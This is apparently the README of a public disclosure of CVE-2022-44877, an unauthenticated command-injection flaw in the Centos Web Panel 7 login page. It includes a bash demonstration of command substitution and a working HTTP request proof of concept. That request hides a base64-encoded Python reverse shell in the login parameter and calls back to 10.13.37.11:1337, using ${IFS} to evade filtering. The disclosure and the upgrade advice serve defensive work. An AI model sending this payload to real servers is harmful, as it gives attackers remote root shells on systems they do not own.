# Centos Web Panel 7 Unauthenticated Remote Code Execution - CVE-2022-44877

```
[+] Centos Web Panel 7 Unauthenticated Remote Code Execution
[+] Centos Web Panel 7 - < 0.9.8.1147
[+] Affected Component ip:2031/login/index.php?login=$(whoami)
[+] Discoverer: Numan Türle @ Gais Cyber Security
[+] Vendor: https://centos-webpanel.com/ - https://control-webpanel.com/changelog#1669855527714-450fb335-6194
```
[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/kiLfSvc1SYY/0.jpg)](https://www.youtube.com/watch?v=kiLfSvc1SYY)


## Description

https://www.gnu.org/software/bash/manual/html_node/Double-Quotes.html

https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html

```
➜  CVE-2022-44877 echo "example_log" >> log
➜  CVE-2022-44877 cat log
example_log
➜  CVE-2022-44877 echo "example_log $(whoami)" >> log
➜  CVE-2022-44877 cat log
example_log
example_log root
➜  CVE-2022-44877
```

![img](https://github.com/numanturle/CVE-2022-44877/blob/main/1.png?raw=true)

![img](https://github.com/numanturle/CVE-2022-44877/blob/main/2.png?raw=true)



## Proof of concept:
```
POST /login/index.php?login=$(echo${IFS}cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTMuMzcuMTEiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJyAg${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash) HTTP/1.1
Host: 10.13.37.10:2031
Cookie: cwpsrv-2dbdc5905576590830494c54c04a1b01=6ahj1a6etv72ut1eaupietdk82
Content-Length: 40
Origin: https://10.13.37.10:2031
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://10.13.37.10:2031/login/index.php?login=failed
Accept-Encoding: gzip, deflate
Accept-Language: en
Connection: close

username=root&password=toor&commit=Login
```

## Solution

Upgrade to CWP7 current version.
